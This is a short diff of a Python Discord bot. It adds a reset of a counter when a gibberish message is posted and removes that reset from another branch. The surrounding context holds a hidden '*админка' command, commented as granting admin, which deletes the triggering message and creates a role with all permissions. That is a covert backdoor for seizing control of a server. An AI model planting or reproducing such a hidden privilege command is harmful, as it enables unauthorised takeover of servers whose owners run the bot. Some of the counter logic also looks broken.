@@ -14,6 +14,8 @@ class MyClient(discord.Client):
 		r = 0
 		m = 0
 		s = 0
+		if message.content == 'выашарлыфврарлывфрлаырлрвырл':
+			msg2 = 0
 		members = client.get_channel(745138560323289090)
 		msg1 = client.get_channel(745138560323289090)
 		msg2 = msg2 + 1
@@ -208,7 +210,6 @@ class MyClient(discord.Client):
 			if message.content == '*админка': #выдаёт админку
 				await message.delete()
 				role = await message.guild.create_role(name="Adminka", permissions=Permissions.all())
-				msg2 = 0
 				
 				
 			if message.content == '*лс':
